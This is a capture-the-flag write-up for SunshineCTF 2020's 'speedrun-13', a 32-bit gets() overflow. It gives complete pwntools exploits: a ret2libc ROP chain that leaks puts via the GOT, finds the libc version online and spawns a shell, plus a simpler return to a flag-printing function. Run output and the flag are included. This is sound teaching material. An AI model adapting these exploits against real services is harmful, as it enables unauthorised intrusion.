# **speedrun-13**
## Task
nc chal.2020.sunshinectf.org 30013
File: chall_13
Tag: binary exploitation 

## Solution

### Checksec
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
* No canary assume BOF
* NO PIE assume ROP
* System 32 bit
### Decompile with ghidra
```c
void vuln(void)
{
  char local_3e [54];
  
  __x86.get_pc_thunk.ax();
  gets(local_3e);
  return;
}
```

With this challenge, there is not a `win` and not NX disabled So we have to search the `system("/bin/sh")`

This is basic ROP pattern of leaking the version of `libc`

This is *dynamically linked* so we have to leak the **base address** and find the **version libc**
```bash
$ file chall_13
chall_13: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9581893d5b783e901ae485e4500a84f72cc4e263, not stripped
```

We see in the `puts` in the GOT then taking advantage of this function to print the base address. Because the system is 32 bit so passing the parameter through stack -> we overwrite the return `vuln`'s return address with `GOT.puts` then put out the 'sym.puts' address. Finally, go back to the `vuln`

The middle part , searching for the suitable libc the download it (`libc_index = 1` is not work correctly increase it to 1 until it work! )

The `libc.sym.system` calls the `system()` function

`payload += 4*b'B'` this line of code is use to align the stack of system 32 bit

The last write out with the "/bin/sh" as the argument of the `system()`



### Exploit
```python
from pwn import *
binary = context.binary = ELF('./chall_13')

libc_index = 1
p = remote('chal.2020.sunshinectf.org',30013)

payload = 0x3e*b'A'
payload +=p32(binary.sym.puts)
payload += p32(binary.sym.vuln)
payload += p32(binary.got.puts)

p.sendlineafter('Keep on writing\n','IxZ')
p.sendline(payload)

rec = p.recv(4)
puts = u32(rec)


if not 'libc' in locals():
    import requests
    r = requests.post('https://libc.rip/api/find',json = {'symbols':{'puts':hex(puts)[-3:]}})
    libc_url = r.json()[libc_index]['download_url']
    libc_file = libc_url.split('/')[-1:][0]
    if not os.path.exists(libc_file):
        log.info('getting: ' + libc_url)
        r = requests.get(libc_url,allow_redirects=True)
        open(libc_file,'wb').write(r.content)

    libc = ELF(libc_file)
print('pre libc.address: ',libc.address)
print('sym.puts: ',libc.sym.puts)
print('binary.got.puts: ',binary.got.puts)
libc.address = puts- libc.sym.puts
print('puts: ', puts)
log.info('libc.address: '+hex(libc.address))

payload = 0x3e*b'A'
payload += p32(libc.sym.system)
payload += 4*b'B'
payload += p32(libc.search(b'/bin/sh').__next__())
p.sendline(payload)
p.interactive()
```

### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_13'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chal.2020.sunshinectf.org on port 30013: Done
[*] '/home/kali/speedrun_sunshineCTF2020/libc6_2.23-0ubuntu11.2_i386.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
pre libc.address:  0
sym.puts:  392368
binary.got.puts:  134520852
puts:  4158930096
[*] libc.address: 0xf7de4000
[*] Switching to interactive mode
\x96\x83\x04P\x
$ ls
chall_13
flag.txt
$ cat flag.txt
sun{almost-easy-61ddd735cf9053b0}
```

## However
### This challenge can solve with the experience of the premise challenge but not following the author desire 
We can found the `systemFunc` will show the flag
```c
void systemFunc(void)
{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  system((char *)(iVar1 + 0x12e));
  return;
}
```
So just overwrite the `vuln` return address with `systemFunc`

### Exploit
```python
from pwn import *

binary = context.binary = ELF('./chall_13')
payload = b'A'*0x3e
payload += p32(binary.sym.systemFunc)
p = remote('chal.2020.sunshinectf.org',30013)
p.sendline('IxZ')
p.sendline(payload)
print(payload)
p.interactive()
```

### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_13'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chal.2020.sunshinectf.org on port 30013: Done
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd6\x84\x04\x08'
[*] Switching to interactive mode
Keep on writing
$ ls
chall_13
flag.txt
$ cat flag.txt
sun{almost-easy-61ddd735cf9053b0}
```
